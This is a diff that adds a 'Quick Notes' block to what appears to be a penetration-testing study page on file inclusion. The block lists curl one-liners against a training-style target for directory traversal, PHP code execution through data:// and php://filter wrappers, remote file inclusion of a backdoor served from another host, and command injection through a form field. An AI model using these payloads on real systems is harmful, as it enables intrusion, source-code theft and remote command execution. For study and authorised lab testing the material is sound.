@@ -181,6 +181,37 @@
 <li><a href="https://swisskyrepo.github.io/PayloadsAllTheThings/File%20Inclusion/">Payloads All The Things</a></li>
 <li><a href="https://medium.com/@Aptive/local-file-inclusion-lfi-web-application-penetration-testing-cc9dc8dd3601">LFI Medium Article</a></li>
 </ul>
+<h3 id="quick-notes"><a class="header" href="#quick-notes">Quick Notes</a></h3>
+<pre><code>Directory Traversal
+
+Curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log
+
+ 
+
+LFI
+
+Curl http://mountaindesserts.com/meteor/index.php?page=data://text/plain,&lt;?php%20echo%20system('ls');?&gt;
+
+ 
+
+PHP Wrapper
+
+Curl http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php
+
+Curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php
+
+ 
+
+RFI
+
+Curl http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simplebackdoor.php&amp;cmd=ls
+
+ 
+
+Command Injection:
+
+curl -X POST --data 'Archive=git%3Bipconfig' http://192.168.50.189:8000/archive
+</code></pre>
 <h3 id="local-file-inclusion"><a class="header" href="#local-file-inclusion">Local File Inclusion:</a></h3>
 <ol>
 <li>Check if you can convert LFI to RFI</li>
